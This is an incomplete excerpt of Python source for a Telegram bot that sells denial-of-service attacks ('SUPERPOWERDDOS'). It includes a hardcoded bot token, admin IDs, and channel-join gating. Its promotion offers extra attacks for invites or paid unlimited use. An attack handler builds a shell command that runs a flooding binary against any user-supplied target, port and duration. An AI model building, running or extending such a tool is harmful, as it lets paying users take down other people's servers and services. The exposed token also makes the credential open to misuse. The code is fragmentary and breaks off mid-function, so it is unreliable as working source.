...
# Bot configuration
BOT_USERNAME = "@SUPERPOWERDDOS_BOT"
bot = telebot.TeleBot('7380335556:AAHRmkqU2Wg31sVB631o7NQ71qWHTc_G80k')
ADMIN_IDS = {"5962383405"}
CHANNEL_USERNAME = "@💀𝚂𝙾𝚄𝚁𝙰𝚅 𝚇 𝚅𝙸𝙺𝙺𝚄💀"
FEEDBACK_CHANNEL = "@💀𝚂𝙾𝚄𝚁𝙰𝚅 𝚇 𝚅𝙸𝙺𝙺𝚄💀"
PAID_CHANNEL = "@SOURAVISLIVE"
CONTACT_ADMINS = ["@SOURAVISLIVE", "@SOURAVISLIVE"]
...
ABUSE_WORDS = {"bsdk", "teri maa ki chut", "lund", "selling", "buy", "dm", "DM"}
...
def handle_user(user_id, user_data, bot, message):
    ...
    bot.reply_to(message, "✅ Aap dono channels me ho!")
...
CHANNEL_USERNAME = "Main Channel – https://t.me/+ZOwep4Yba59hYmI1"
FEEDBACK_CHANNEL = "Feedback Channel – https://t.me/+684T5CsBQcBmMWM9"

if not is_user_in_both_channels(user_id):
    bot.reply_to(message, f"❌ Dono channel join karo pehle!\n🔗 {CHANNEL_USERNAME}\n🔗 {FEEDBACK_CHANNEL}")
    return
...
🔥 DM - @SOURAVISLIVE & @SOURAVISLIVE to use!
💎 +1 attack per invite to @SOURAVISLIVE after limit or buy unlimited from @SOURAVISLIVE
"""
...
def handle_attack(message):
    ...
    full_command = f"./vikku {target} {port} {time_duration} 512 800"
    try:
